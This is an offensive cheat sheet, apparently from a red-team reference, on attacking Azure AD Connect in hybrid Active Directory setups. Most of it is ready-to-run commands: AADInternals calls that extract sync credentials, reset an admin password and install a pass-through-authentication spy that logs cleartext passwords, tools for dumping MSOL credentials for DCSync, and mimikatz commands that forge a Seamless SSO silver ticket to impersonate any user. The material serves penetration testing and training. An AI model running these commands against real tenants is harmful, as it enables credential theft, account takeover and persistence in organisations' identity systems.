# Azure AD - AD Connect and Cloud Sync

| Active Directory                  | Azure AD          |
|-----------------------------------|-------------------|
| LDAP                              | REST API'S        |
| NTLM/Kerberos                     | OAuth/SAML/OpenID |
| Structured directory (OU tree)    | Flat structure    |
| GPO                               | No GPO's          |
| Super fine-tuned access controls  | Predefined roles  |
| Domain/forest                     | Tenant            |
| Trusts                            | Guests            |

Check if Azure AD Connect is installed : `Get-ADSyncConnector`

* For **PHS**, we can extract the credentials
    * Passwords from on-premise AD are sent to the cloud
    * Use replication via a service account created by AD Connect
* For **PTA**, we can attack the agent
    * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text
* For **Federation**, connect Windows Server AD to Azure AD using Federation Server (ADFS)
    * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password
    * extract the certificate from ADFS server using DA


## Password Hash Synchronization

Get token for `SYNC_*` account and reset on-prem admin password

```powershell
PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
PS > Get-AADIntSyncCredentials

PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache

PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose
```


## Pass-Through Authentication

1. Check if PTA is installed : `Get-Command -Module PassthroughAuthPSModule`
2. Install a PTA Backdoor
    ```powershell
    PS AADInternals> Install-AADIntPTASpy
    PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords
    ```

## Federation

* [Golden SAML](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adfs-federation-services/)


## AD Connect - Credentials

* [dirkjanm/adconnectdump](https://github.com/dirkjanm/adconnectdump) - Dump Azure AD Connect credentials for Azure AD and Active Directory

Tool | Requires code execution on target | DLL dependencies | Requires MSSQL locally | Requires python locally
--- | --- | --- | --- | ---
ADSyncDecrypt | Yes | Yes | No | No
ADSyncGather | Yes | No | No | Yes
ADSyncQuery | No (network RPC calls only) | No | Yes | Yes

* **ADSyncDecrypt**: Decrypts the credentials fully on the target host. Requires the AD Connect DLLs to be in the PATH. A similar version in PowerShell was released by Adam Chester on his blog.
* **ADSyncGather**: Queries the credentials and the encryption keys on the target host, decryption is done locally (python). No DLL dependencies.
* **ADSyncQuery**: Queries the credentials from the database that is saved locally. Requires MSSQL LocalDB to be installed. No DLL dependencies. Is called from adconnectdump.py, dumps data without executing anything on the Azure AD connect host.

Credentials in ADSync : `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`


## AD Connect - DCSync with MSOL Account 

You can perform **DCSync** attack using the MSOL account.

Requirements:
  * Compromise a server with Azure AD Connect service
  * Access to ADSyncAdmins or local Administrators groups

Use the script **azuread_decrypt_msol.ps1** from @xpn to recover the decrypted password for the MSOL account:
* `azuread_decrypt_msol.ps1`: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
* `azuread_decrypt_msol_v2.ps1`: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c

Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.


## AD Connect - Seamless Single Sign On Silver Ticket

> Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)

> Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account **AZUREADSSOC** is created in the on-prem AD.

:warning: The password of the AZUREADSSOACC account never changes.

Using [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure

1. NTLM password hash of the AZUREADSSOACC account, e.g. `f9969e088b2c13d93833d0ce436c76dd`. 
    ```powershell
    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
    ```
2. AAD logon name of the user we want to impersonate, e.g. `elrond@contoso.com`. This is typically either his userPrincipalName or mail attribute from the on-prem AD.
3. SID of the user we want to impersonate, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`.
4. Create the Silver Ticket and inject it into Kerberos cache:
    ```powershell
    mimikatz.exe "kerberos::golden /user:elrond
    /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
    /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
    /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
    ```
5. Launch Mozilla Firefox
6. Go to about:config and set the `network.negotiate-auth.trusted-uris preference` to value `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
7. Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.


## References

* [Introduction to Microsoft Entra Connect V2 - Microsoft](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-azure-ad-connect-v2)
* [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory - Dirk-jan Mollema - 1st apr. 2019](https://www.youtube.com/watch?v=JEIR5oGCwdg)
* [Impersonating Office 365 Users With Mimikatz - Michael Grafnetter - January 15, 2017](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [Azure AD Overview - John Savill's Technical Training - Oct 7, 2014](https://www.youtube.com/watch?v=l_pnNpdxj20) 
* [Windows Azure Active Directory in plain English - Openness AtCEE - Jan 9, 2014](https://www.youtube.com/watch?v=IcSATObaQZE)
* [Azure AD connect for RedTeam - Adam Chester @xpnsec -  2019-02-18](https://blog.xpnsec.com/azuread-connect-for-redteam/)
* [Azure AD Kerberos Tickets: Pivoting to the Cloud - Edwin David - February 09, 2023](https://trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud)
* [DUMPING NTHASHES FROM MICROSOFT ENTRA ID - Secureworks](https://www.secureworks.com/research/dumping-nthashes-from-microsoft-entra-id)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)